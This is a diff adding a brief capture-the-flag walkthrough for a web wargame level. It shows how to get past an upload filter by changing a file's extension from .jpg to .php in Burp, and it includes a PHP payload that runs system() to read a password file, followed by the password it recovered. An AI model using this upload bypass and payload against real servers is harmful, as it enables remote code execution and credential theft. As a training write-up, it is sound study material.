@@ -1,0 +1,25 @@
+we can upload an image to the server.
+filename is ignored and .jpg is hardcoded when uploaded.
+
+The point is trying to upload a php file to get the webserver to execute it.
+Make a simple php file test.php:
+<?php
+	echo ("Hiiiiiiiiiii")
+?>
+
+but when we try to upload this file, the server will make it: /upload/grejhb3hb.jpg
+
+Let's use Burp to intercept and modify the extension, change the extension from jpg to
+php => forward
+
+fhr34.php has been uploaded. When we click on it, the webserver outputs Hiiiiiiiiii
+
+now we can try to cat the flag for the next level:
+
+<?php
+	system('cat /etc/natas_webpass/natas13');
+?>
+
+reupload, intercept and change the extension, the webserver will output:
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
